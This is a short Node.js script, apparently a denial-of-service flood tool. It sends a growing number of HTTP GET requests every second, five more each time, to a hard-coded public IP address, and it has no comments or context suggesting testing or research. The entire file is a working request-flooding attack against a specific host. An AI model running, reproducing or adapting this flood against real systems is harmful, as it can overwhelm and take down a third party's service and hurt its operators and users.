const http = require('http');

let requests = 0;

setInterval(()=> {
  requests += 5;
  for (let i = 0; i < requests; i++) {
http.get('http://91.193.113.71')
}
}, 1000)
